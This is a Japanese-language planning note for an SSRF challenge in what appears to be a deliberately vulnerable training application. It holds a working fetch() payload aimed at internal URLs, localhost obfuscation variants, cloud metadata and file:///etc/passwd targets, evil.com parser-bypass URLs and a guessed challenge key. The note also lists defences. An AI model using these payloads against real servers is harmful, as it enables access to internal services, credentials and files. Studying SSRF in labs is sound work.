# SSRF ❌

**難易度:** ⭐⭐⭐⭐⭐⭐
**カテゴリ:** SSRF (Server-Side Request Forgery)
**目標:** サーバーを騙して内部リソースにアクセスさせる

---

## 思考プロセス

**ステップ1: SSRF の基本を理解**
```
「SSRF = サーバー側リクエスト偽造」
    ↓
「ユーザーがURLを指定 → サーバーがそのURLにアクセス」
    ↓
「内部ネットワークのURLを指定したら？」
    ↓
「サーバーが内部リソースにアクセスしてしまう」
```

**ステップ2: SSRF 可能な機能を探す**
```
「URLを入力できる機能を探す」
    ↓
「プロフィール画像のURL指定機能」
    ↓
「サーバーが画像をフェッチする → SSRF の可能性」
```

**ステップ3: 攻撃シナリオ**
```
「プロフィール画像URLに内部URLを指定」
    ↓
「http://localhost:3000/internal/... など」
    ↓
「サーバーが自身にリクエスト → 内部APIにアクセス」
    ↓
「通常アクセスできないエンドポイントに到達」
```

## SSRF の危険性

1. **内部ネットワークへのアクセス**
   - ファイアウォールをバイパス
   - 内部サービス (Redis, Elasticsearch) への攻撃

2. **クラウドメタデータの取得**
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - GCP: `http://metadata.google.internal/`

3. **ローカルファイルの読み取り**
   - `file:///etc/passwd`

## 攻撃対象エンドポイント

```
/profile/image/url  - プロフィール画像URL
/api/Products/{id}  - 商品画像URL
```

## 実行手順

1. **プロフィール画像URL機能を確認**
   ```javascript
   // プロフィールページで URL を入力できるか確認
   // Network タブでリクエストを観察
   ```

2. **内部URLへのアクセスを試行**
   ```javascript
   // ログイン後に実行
   fetch('/profile/image/url', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
       'Authorization': 'Bearer ' + localStorage.getItem('token')
     },
     body: JSON.stringify({
       imageUrl: 'http://localhost:3000/api/Challenges'
     })
   }).then(r => r.text()).then(console.log);
   ```

3. **様々なURLを試す**
   ```
   # localhost の別表記
   http://127.0.0.1:3000/...
   http://[::1]:3000/...
   http://localhost.localdomain:3000/...
   
   # IP アドレスの変換
   http://2130706433:3000/...     # 127.0.0.1 の decimal 表記
   http://0x7f000001:3000/...     # hex 表記
   http://0177.0.0.1:3000/...     # octal 表記
   
   # DNS rebinding
   http://localtest.me:3000/...   # 127.0.0.1 を返すドメイン
   
   # File スキーム
   file:///etc/passwd
   ```

4. **チャレンジ特有のエンドポイント**
   ```
   # SSRF チャレンジの完了条件（推測）
   http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_444_u
   ```

## バイパステクニック

### URL パース の違いを利用
```
http://localhost:3000@evil.com/  → evil.com にアクセス（一部のパーサー）
http://localhost:3000#@evil.com/ → localhost にアクセス（別のパーサー）
```

### オープンリダイレクト との組み合わせ
```
1. 許可されたURL: http://allowed.com/redirect?url=http://localhost/
2. サーバーが allowed.com にアクセス
3. リダイレクトで localhost にアクセス
```

## 検証ポイント

- [ ] プロフィール画像URL機能を確認
- [ ] 内部URLが拒否されるか確認
- [ ] バイパステクニックを試行
- [ ] チャレンジ完了条件を満たす

## 対策

- URL のホワイトリスト検証
- プライベート IP アドレスの拒否
- リダイレクト先の検証
- 外部リクエストをプロキシ経由に

## 関連チャレンジ

- [Allowlist Bypass](../difficulty-4/allowlist-bypass.md)
- [XXE Data Access](../difficulty-3/xxe-data-access.md)

## 解説

[未着手]
